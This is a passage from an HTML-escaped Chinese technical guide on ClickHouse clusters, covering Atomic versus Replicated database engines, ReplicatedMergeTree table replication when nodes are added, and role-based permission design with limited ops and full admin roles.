 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;CREATE DATABASE dbtest ON CLUSTER default_cluster ENGINE = Atomic;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;特点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;结构简单&lt;/li&gt;
&lt;li&gt;❌ 新节点加入后需手动建库&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;适合：
👉 集群稳定、扩容极少&lt;/p&gt;
&lt;hr&gt;
&lt;h2 class="heading-element" id="模式二replicated-database推荐生产"&gt;&lt;span&gt;模式二：Replicated Database（推荐生产）&lt;/span&gt;
 &lt;a href="#%e6%a8%a1%e5%bc%8f%e4%ba%8creplicated-database%e6%8e%a8%e8%8d%90%e7%94%9f%e4%ba%a7" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;CREATE DATABASE dbtest ON CLUSTER default_cluster ENGINE = Replicated(&amp;#39;/clickhouse/databases/dbtest&amp;#39;, &amp;#39;{shard}&amp;#39;, &amp;#39;{replica}&amp;#39;);
-- Replicated 引擎：
-- 在 ClickHouse 中，Replicated 引擎用于在集群中的多个节点上存储相同的数据副本。
-- 这可以确保即使某些节点出现故障，数据仍然可用。每个副本会保持一致性，并能自动进行故障恢复
-- &amp;#39;/clickhouse/databases/&amp;lt;db_name&amp;gt;&amp;#39;, &amp;#39;{shard}&amp;#39;, &amp;#39;{replica}&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;特点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;数据库元数据存于 Keeper&lt;/li&gt;
&lt;li&gt;新节点自动可见&lt;/li&gt;
&lt;li&gt;扩容成本最低(全自动)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;📌 &lt;strong&gt;这是“长期可演进集群”的推荐选择&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 class="heading-element" id="5-表级复制是自动复制的真正前提"&gt;&lt;span&gt;5. 表级复制是“自动复制”的真正前提&lt;/span&gt;
 &lt;a href="#5-%e8%a1%a8%e7%ba%a7%e5%a4%8d%e5%88%b6%e6%98%af%e8%87%aa%e5%8a%a8%e5%a4%8d%e5%88%b6%e7%9a%84%e7%9c%9f%e6%ad%a3%e5%89%8d%e6%8f%90" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h1&gt;&lt;h2 class="heading-element" id="51-标准建表规范"&gt;&lt;span&gt;5.1 标准建表规范&lt;/span&gt;
 &lt;a href="#51-%e6%a0%87%e5%87%86%e5%bb%ba%e8%a1%a8%e8%a7%84%e8%8c%83" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;CREATE TABLE dbtest.test_table
-- 一般由 create database 指定，指定后此处就不再指定，否则会报告错误 
-- ON CLUSTER default_cluster
(
 event_time DateTime,
 user_id UInt64,
 event_type String
)
ENGINE = ReplicatedMergeTree
PARTITION BY toYYYYMM(event_time)
ORDER BY (event_time, user_id);

-- 推荐设置此项，防止数据堆积
-- TTL event_time &amp;#43; INTERVAL 7 DAY TO DISK &amp;#39;cold&amp;#39; SETTINGS storage_policy = &amp;#39;hot_to_cold&amp;#39;;
-- 根据 event_time 字段，自动将超过 7 天的数据迁移到 &amp;#39;cold&amp;#39; 存储中，并使用 hot_to_cold 存储策略。
-- 存储策略配置查看 config.d/storage.xml&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="关键结论"&gt;&lt;span&gt;关键结论：&lt;/span&gt;
 &lt;a href="#%e5%85%b3%e9%94%ae%e7%bb%93%e8%ae%ba" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;是否自动复制 &lt;strong&gt;与 ON CLUSTER 无关&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;是否自动复制 &lt;strong&gt;完全取决于 ReplicatedMergeTree&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 class="heading-element" id="52-关于-replicated-路径重要结论"&gt;&lt;span&gt;5.2 关于 Replicated 路径（重要结论）&lt;/span&gt;
 &lt;a href="#52-%e5%85%b3%e4%ba%8e-replicated-%e8%b7%af%e5%be%84%e9%87%8d%e8%a6%81%e7%bb%93%e8%ae%ba" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;在 &lt;code&gt;ClickHouse 23+ / 25.x&lt;/code&gt; 中：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ENGINE = ReplicatedMergeTree
-- 不再推荐手写 ZooKeeper / Keeper 路径，而是自动生成路径
-- 此项设定会避免不必要的冲突、便于迁移、也更加安全&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="53-扩容时自动复制是如何发生的"&gt;&lt;span&gt;5.3 扩容时「自动复制」是如何发生的？&lt;/span&gt;
 &lt;a href="#53-%e6%89%a9%e5%ae%b9%e6%97%b6%e8%87%aa%e5%8a%a8%e5%a4%8d%e5%88%b6%e6%98%af%e5%a6%82%e4%bd%95%e5%8f%91%e7%94%9f%e7%9a%84" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;当你：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;新增一台 &lt;code&gt;ClickHouse&lt;/code&gt; 节点&lt;/li&gt;
&lt;li&gt;加入 &lt;code&gt;cluster.xml&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;配置相同的 &lt;code&gt;Keeper&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;启动 &lt;code&gt;clickhouse-server&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;会发生：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;Replicated Database&lt;/code&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;自动看到 &lt;code&gt;dbtest&lt;/code&gt; 数据库&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;ReplicatedMergeTree&lt;/code&gt; 表：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;自动创建 &lt;code&gt;replica&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;自动拉取历史数据&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;必要时可手动触发：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;SYSTEM SYNC REPLICA dbtest.test_table;&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 class="heading-element" id="6-clickhouse-集群架构设计与元数据管理"&gt;&lt;span&gt;6. ClickHouse 集群架构设计与元数据管理&lt;/span&gt;
 &lt;a href="#6-clickhouse-%e9%9b%86%e7%be%a4%e6%9e%b6%e6%9e%84%e8%ae%be%e8%ae%a1%e4%b8%8e%e5%85%83%e6%95%b0%e6%8d%ae%e7%ae%a1%e7%90%86" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h1&gt;&lt;h2 class="heading-element" id="61-传统模式atomic-数据库--手动路径管理"&gt;&lt;span&gt;6.1 传统模式(Atomic 数据库 + 手动路径管理)&lt;/span&gt;
 &lt;a href="#61-%e4%bc%a0%e7%bb%9f%e6%a8%a1%e5%bc%8fatomic-%e6%95%b0%e6%8d%ae%e5%ba%93--%e6%89%8b%e5%8a%a8%e8%b7%af%e5%be%84%e7%ae%a1%e7%90%86" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;数据库创建：使用 &lt;code&gt;Atomic&lt;/code&gt; 引擎（不带路径参数）。&lt;/li&gt;
&lt;li&gt;表创建：必须指定路径参数。
&lt;pre&gt;&lt;code&gt;-- 数据库只是个文件夹（Atomic 默认）
CREATE DATABASE testdb ON CLUSTER default_cluster; 

-- 表必须明确告诉 Keeper 它的位置
CREATE TABLE testdb.test_table (...) 
ENGINE = ReplicatedMergeTree(&amp;#39;/clickhouse/tables/{shard}/dbtest/test_table&amp;#39;, &amp;#39;{replica}&amp;#39;)
ORDER BY id;&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;优缺点
&lt;ul&gt;
&lt;li&gt;元数据存储：散落在每个节点的本地磁盘。&lt;/li&gt;
&lt;li&gt;同步机制：依赖 &lt;code&gt;ON CLUSTER&lt;/code&gt; 语句进行即时广播。如果节点在执行时离线，则该节点不会创建表。&lt;/li&gt;
&lt;li&gt;路径定义：必须手动在 SQL 中指定 ZooKeeper 路径，运维成本随表数量线性增长&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;此项适用于：&lt;strong&gt;小规模集群、表数量不多、扩容频率极低&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 class="heading-element" id="62-元数据托管模式replicated-数据库--自动元数据托管"&gt;&lt;span&gt;6.2 元数据托管模式(Replicated 数据库 + 自动元数据托管)&lt;/span&gt;
 &lt;a href="#62-%e5%85%83%e6%95%b0%e6%8d%ae%e6%89%98%e7%ae%a1%e6%a8%a1%e5%bc%8freplicated-%e6%95%b0%e6%8d%ae%e5%ba%93--%e8%87%aa%e5%8a%a8%e5%85%83%e6%95%b0%e6%8d%ae%e6%89%98%e7%ae%a1" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;数据库创建：使用 &lt;code&gt;Replicated&lt;/code&gt; 引擎, 携带 &lt;code&gt;ZK&lt;/code&gt; 路径， 表创建不携带 &lt;code&gt;ZK&lt;/code&gt; 路径
&lt;pre&gt;&lt;code&gt;-- 1. 创建高可用同步库 (指定库级 ZK 根路径)
-- Replicated(&amp;#39;/clickhouse/databases/&amp;lt;db_name&amp;gt;&amp;#39;, &amp;#39;{shard}&amp;#39;, &amp;#39;{replica}&amp;#39;);
CREATE DATABASE dbtest ON CLUSTER default_cluster 
ENGINE = Replicated(&amp;#39;/clickhouse/databases/dbtest&amp;#39;, &amp;#39;{shard}&amp;#39;, &amp;#39;{replica}&amp;#39;);

-- 2. 创建表：严禁指定参数，实现全自动托管
CREATE TABLE dbtest.order_items ON CLUSTER default_cluster
(
 order_id UInt64,
 price Float64
)
ENGINE = ReplicatedMergeTree
ORDER BY order_id;&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;优缺点
&lt;ul&gt;
&lt;li&gt;元数据存储：集中化存储在 &lt;code&gt;Keeper/ZooKeeper&lt;/code&gt; 中。&lt;/li&gt;
&lt;li&gt;同步机制：新节点启动时自动拉取 &lt;code&gt;Keeper&lt;/code&gt; 上的库表定义。无需关心 &lt;code&gt;ON CLUSTER&lt;/code&gt; 是否送达，具有&lt;strong&gt;自愈&lt;/strong&gt;能力。&lt;/li&gt;
&lt;li&gt;路径定义：由数据库引擎根据 &lt;code&gt;UUID&lt;/code&gt; 自动分配路径，消灭了手动拼接路径导致的碰撞风险。&lt;/li&gt;
&lt;li&gt;扩容时只需配置新节点的 &lt;code&gt;macros.xml&lt;/code&gt; 并启动，数秒内所有库、表自动&lt;strong&gt;克隆&lt;/strong&gt;完成，运维实现&lt;em&gt;&lt;strong&gt;零介入&lt;/strong&gt;&lt;/em&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;此项适用于：&lt;strong&gt;大规模集群、表数量多、扩容频繁&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h1 class="heading-element" id="7-权限模型总览核心结构"&gt;&lt;span&gt;7. 权限模型总览（核心结构）&lt;/span&gt;
 &lt;a href="#7-%e6%9d%83%e9%99%90%e6%a8%a1%e5%9e%8b%e6%80%bb%e8%a7%88%e6%a0%b8%e5%bf%83%e7%bb%93%e6%9e%84" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;flowchart LR
 User[User&amp;lt;br/&amp;gt;（用户）] --&amp;gt;|赋予| Role[Role&amp;lt;br/&amp;gt;（角色）]
 Role --&amp;gt;|赋予| Privilege[Privilege&amp;lt;br/&amp;gt;（权限）]
 Privilege --&amp;gt;|作用于| DB[Database/Table&amp;lt;br/&amp;gt;（数据库/表）]

 style User fill:#e3f2fd,stroke:#1976d2
 style Role fill:#e8f5e9,stroke:#388e3c
 style Privilege fill:#fff3e0,stroke:#fbc02d
 style DB fill:#ede7f6,stroke:#7b1fa2&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;用户只绑定角色&lt;/li&gt;
&lt;li&gt;角色才拥有权限&lt;/li&gt;
&lt;li&gt;权限始终以数据库为边界&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h1 class="heading-element" id="8-运维角色设计全局"&gt;&lt;span&gt;8. 运维角色设计（全局）&lt;/span&gt;
 &lt;a href="#8-%e8%bf%90%e7%bb%b4%e8%a7%92%e8%89%b2%e8%ae%be%e8%ae%a1%e5%85%a8%e5%b1%80" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h1&gt;&lt;h2 class="heading-element" id="81-为什么运维角色是全局的"&gt;&lt;span&gt;8.1 为什么运维角色是全局的？&lt;/span&gt;
 &lt;a href="#81-%e4%b8%ba%e4%bb%80%e4%b9%88%e8%bf%90%e7%bb%b4%e8%a7%92%e8%89%b2%e6%98%af%e5%85%a8%e5%b1%80%e7%9a%84" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;表结构、复制、副本是全局行为&lt;/li&gt;
&lt;li&gt;拆分会造成权限碎片&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 class="heading-element" id="82-推荐运维角色生产"&gt;&lt;span&gt;8.2 推荐运维角色（生产）&lt;/span&gt;
 &lt;a href="#82-%e6%8e%a8%e8%8d%90%e8%bf%90%e7%bb%b4%e8%a7%92%e8%89%b2%e7%94%9f%e4%ba%a7" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;CREATE ROLE ops_role ON CLUSTER default_cluster;
GRANT SELECT, CREATE, ALTER, OPTIMIZE, SYSTEM, SHOW ON *.* TO ops_role;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;不直接授予 &lt;code&gt;ALL&lt;/code&gt;, 原因：&lt;code&gt;DROP&lt;/code&gt; / &lt;code&gt;TRUNCATE&lt;/code&gt; 属于事故级操作&lt;/p&gt;
&lt;h2 class="heading-element" id="83-超级管理员角色-不推荐"&gt;&lt;span&gt;8.3 超级管理员角色 (不推荐)&lt;/span&gt;
 &lt;a href="#83-%e8%b6%85%e7%ba%a7%e7%ae%a1%e7%90%86%e5%91%98%e8%a7%92%e8%89%b2-%e4%b8%8d%e6%8e%a8%e8%8d%90" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;CREATE ROLE admin_role ON CLUSTER default_cluster;

GRANT ALL ON *.* TO admin_role WITH GRANT OPTION;
-- 默认default不具备 ALL 的授权，因此上诉授权可能失败，采用以下方式解决，或者通过配置文件建立一个具备all的管理用户(TODO: 未测试该项)
-- GRANT CURRENT GRANTS ON *.* TO admin_role;

-- 查看 admin_role 的权限
-- SHOW GRANTS FOR admin_role;
